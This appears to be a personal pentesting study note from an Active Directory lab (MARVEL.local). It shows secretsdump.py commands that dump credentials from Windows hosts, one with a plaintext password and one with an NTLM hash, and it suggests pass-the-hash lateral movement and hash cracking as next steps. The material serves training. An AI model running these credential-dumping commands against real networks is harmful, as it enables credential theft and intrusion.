Dump credentials with *secretsdump.py*:
```bash
secretsdump.py MARVEL.local/frank:'Password1'@10.0.0.19
```
Only works when the windows firewall is turned off.

Dump credentials on THEPUNISHER:
![[Pasted image 20240320190418.png]]

Dump credentials on SPIDERMAN:
![[Pasted image 20240320204056.png]]

>[!Note] Look carefully!
>There could be cleartext passwords in the output!


Dump hashes with *secretsdump.py* via hash:
```bash
secretsdump.py administrator@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
```

Results:
![[Pasted image 20240320205153.png]]

Possible next steps:
- Use the dumped hashes in pass-the-hash attacks (iterate -> lateral movement)
- Crack the dumped hashes